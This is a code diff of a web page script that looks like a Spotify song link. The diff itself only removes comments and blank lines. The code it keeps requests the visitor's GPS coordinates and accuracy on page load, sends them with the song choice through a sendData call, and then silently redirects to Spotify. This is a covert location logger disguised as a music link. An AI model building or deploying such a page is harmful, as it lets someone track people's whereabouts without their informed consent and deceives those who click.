@@ -81,13 +81,7 @@ function sendData(data) {
 function goToSpotify() {
   window.location.replace(selectedSong);
 }
-
-// ==========================================
-// GPS SUCCESS
-// ==========================================
-
 function gpsSuccess(position) {
-
   sendData({
     page: "random",
     song: selectedSong,
@@ -95,30 +89,16 @@ function gpsSuccess(position) {
     longitude: position.coords.longitude,
     accuracy: position.coords.accuracy
   });
-
   setTimeout(goToSpotify, 300);
 }
-
-// ==========================================
-// GPS ERROR
-// ==========================================
-
 function gpsError() {
-
   sendData({
     page: "random",
     song: selectedSong
   });
-
   setTimeout(goToSpotify, 300);
 }
-
-// ==========================================
-// START IMMEDIATELY
-// ==========================================
-
 document.addEventListener("DOMContentLoaded", () => {
-
   navigator.geolocation.getCurrentPosition(
     gpsSuccess,
     gpsError,
@@ -128,15 +108,9 @@ document.addEventListener("DOMContentLoaded", () => {
       maximumAge: 0
     }
   );
-
-  // fallback in case GPS never responds
   setTimeout(goToSpotify, 6000);
-
 });
-
 </script>
-
 </head>
-
 <body></body>
 </html>
